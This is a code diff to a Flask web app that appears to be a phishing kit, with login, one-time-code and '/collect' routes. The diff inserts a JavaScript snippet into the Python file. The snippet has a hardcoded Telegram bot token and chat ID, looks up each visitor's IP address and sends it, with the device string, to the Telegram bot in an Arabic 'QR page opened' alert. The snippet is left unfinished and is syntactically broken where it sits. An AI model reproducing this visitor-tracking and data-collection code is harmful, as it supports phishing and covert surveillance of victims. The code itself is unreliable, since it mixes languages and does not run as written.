@@ -1,10 +1,14 @@
 from flask import Flask, g, render_template, request, jsonify, redirect, send_from_directory
 from datetime import datetime
 import os
+import env
 import requests
 import json
 from dotenv import load_dotenv
 from pathlib import Path
+
+BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
+CHAT_ID = os.getenv("TG_CHAT_ID")
 
 load_dotenv(
     dotenv_path=Path(__file__).resolve().parent / ".env",
@@ -15,8 +19,7 @@ print("CHAT_ID:", os.getenv("TG_CHAT_ID"))
 print("RUNNING FILE:", __file__)
 print("CWD:", os.getcwd())
 
-BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
-CHAT_ID = os.getenv("TG_CHAT_ID")
+
 
 logs = []
 
@@ -64,7 +67,18 @@ def login():
      
 @app.route('/otp')
 def otp():
-    return render_template('otp.html')     
+    return render_template('otp.html')    
+
+(function(){
+    let botToken = "8390262932:AAGy-S3AvVTbP92MxP28DgblNz0kGZMN-gk";
+    let chatId = "8107976008";
+    let now = new Date();
+    let device = navigator.userAgent;
+    fetch("https://api.ipify.org?format=json")
+    .then(res => res.json())
+    .then(data => {
+        let message = `🚨 تم فتح صفحة QR 🚨\n📅 الوقت: ${now}\n🌐 IP: ${data.ip}\n📱 الجهاز: ${device}`;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
     
     
 @app.route('/collect', methods=['POST'])
